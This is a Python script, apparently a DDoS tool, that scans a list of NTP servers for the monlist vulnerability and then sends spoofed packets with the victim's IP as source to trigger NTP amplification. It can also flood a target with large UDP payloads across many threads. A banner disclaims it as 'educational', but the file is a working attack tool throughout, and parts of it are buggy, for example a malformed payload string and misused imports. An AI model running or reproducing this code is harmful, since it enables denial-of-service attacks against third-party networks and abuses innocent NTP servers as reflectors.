from ast import arg
from http import server
from itertools import count
from operator import truediv
from random import random, randrange
from telnetlib import IP
from tkinter import W
from termcolor import colored
from requests import get
import threading
import concurrent.futures
import socket
from scapy.all import *
import time



def GetIP():
    ip = get('https://api.ipify.org').content.decode('utf8')
    return ip

monlistPayload =  "\\x17\\x00\\0x03\\x2a\\x00\\x00\\x00\\x00"
localIP = GetIP()
vulnServers = []

def CheckServer(server):
    serverIP = socket.gethostbyname(server)
    print(colored("IP of "+ server + " is " + serverIP, "green"))
    #create a custom UDP packet
    response = sr1(IP(src=localIP,dst=serverIP)/UDP(sport=randrange(1024,65535),dport=123)/monlistPayload, timeout=0.5, verbose = 0)
    #check if response is bigger than 100
    try:
        if response[IP].len > 100:
            print(colored("[ + ] Server " + server + " is vulnerable ...","green" ))
            vulnServers.append(server)
    except:
        print(colored("[ - ] Server "+ server + " not vulnerable ...","red" ))
        return

def ReadServers():
    ntp = open('ntp.txt', 'r')
    lines = ntp.readlines()
    print(colored("Reading servers from ntp.txt .....", "green"))
    for line in lines:
        CheckServer(line)
    ntp.close()

def UDPFlood(target):
        floodIP = (target,randrange(1024,65535))
        floodPayload = random._urandom(20000)
        while(1):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(floodPayload,floodIP)
            time.sleep(2)
            print(colored("[ + ] Flooding target ....", "green"))

def Attack(target, flood):
    #do the magic here
    #choose a random server
    server = random.choice(vulnServers)
    maliciousPacket = (IP(src=target,dst=server)/UDP(sport=randrange(1024,65535),dport=123)/RAW(load=monlistPayload))
    send(maliciousPacket,count=100)
    #then start another UDP flood to crash the server
    if flood:
        UDPFlood(target)
   

def main():
    banner = ''' 

▒███████▒▓█████  ██▓▄▄▄█████▓ ▄▄▄▄    ██▀███  ▓█████  ▄████▄   ██░ ██ ▓█████  ██▀███  
▒ ▒ ▒ ▄▀░▓█   ▀ ▓██▒▓  ██▒ ▓▒▓█████▄ ▓██ ▒ ██▒▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
░ ▒ ▄▀▒░ ▒███   ▒██▒▒ ▓██░ ▒░▒██▒ ▄██▓██ ░▄█ ▒▒███   ▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒
  ▄▀▒   ░▒▓█  ▄ ░██░░ ▓██▓ ░ ▒██░█▀  ▒██▀▀█▄  ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  
▒███████▒░▒████▒░██░  ▒██▒ ░ ░▓█  ▀█▓░██▓ ▒██▒░▒████▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒
░▒▒ ▓░▒░▒░░ ▒░ ░░▓    ▒ ░░   ░▒▓███▀▒░ ▒▓ ░▒▓░░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
░░▒ ▒ ░ ▒ ░ ░  ░ ▒ ░    ░    ▒░▒   ░   ░▒ ░ ▒░ ░ ░  ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
░ ░ ░ ░ ░   ░    ▒ ░  ░       ░    ░   ░░   ░    ░   ░         ░  ░░ ░   ░     ░░   ░ 
  ░ ░       ░  ░ ░            ░         ░        ░  ░░ ░       ░  ░  ░   ░  ░   ░     
░                                  ░                 ░                                

    Coded By 6en6ar!

    Note:
    This program is intended to better know the attacks and should be used for educational purposes only
    The author is not responsible for you actions!!
    
    '''
    print(colored(banner, "green"))
    print(colored("Your outbound IP address is --> " + localIP, "green"))
    target = str(input(colored("Enter your target IP address --> ", "green")))
    threads = int(input(colored("Enter number of threads --> ", "green")))
    ReadServers()

    if len(vulnServers) == 0:
        print(colored("[ - ] None of the servers in ntp.txt are vulnerable ", "red"))
        udpfloodcheck = input(colored("Do you want to flood the server instead (y/n) --> ", "green"))
        if udpfloodcheck == "y":
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                executor.map(UDPFlood(target), range(threads))
        else:
            exit(1)
    else:
        udpflood = input(colored("Do you want to flood the server also (y/n) --> ", "green"))
        if(udpflood =="y"):
            flood = True
        else:
            flood = False

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(Attack(target,flood), range(threads))

if __name__ == "__main__":
    main()